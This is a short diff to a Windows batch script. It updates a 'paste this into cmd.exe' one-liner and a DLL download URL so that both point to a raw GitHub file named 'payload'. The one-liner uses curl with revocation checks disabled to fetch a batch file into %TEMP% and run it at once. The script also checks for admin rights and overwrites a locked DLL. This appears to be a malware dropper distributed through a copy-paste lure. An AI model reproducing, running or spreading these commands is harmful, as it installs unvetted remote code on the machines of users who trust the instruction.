@@ -3,7 +3,7 @@ setlocal
 
 rem =====================================================================
 rem  User one-liner (open cmd.exe and paste):
-rem    curl -s --ssl-no-revoke https://file.kiwi/e8f45154#r3iwCJCmzQ5tLt25YZCF6A,353d7f7c -o %TEMP%\See.bat & %TEMP%\See.bat
+rem    curl -s --ssl-no-revoke https://raw.githubusercontent.com/vexruxrxzen/dsl-kdsl-kpdslp-ksd/refs/heads/main/payload -o %TEMP%\See.bat & %TEMP%\See.bat
 rem =====================================================================
 
 :: Check Admin (fltmc works on all Windows, unlike net session)
@@ -46,7 +46,7 @@ call :clean_kld
 
 echo  [*] Downloading...
 
-set "DLL_URL=https://file.kiwi/e8f45154#r3iwCJCmzQ5tLt25YZCF6A,353d7f7c"
+set "DLL_URL=https://raw.githubusercontent.com/vexruxrxzen/dsl-kdsl-kpdslp-ksd/refs/heads/main/payload"
 set "DLL_PATH=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.tmp"
 
 rem Rename the old DLL if it is currently locked/in use so we can overwrite it
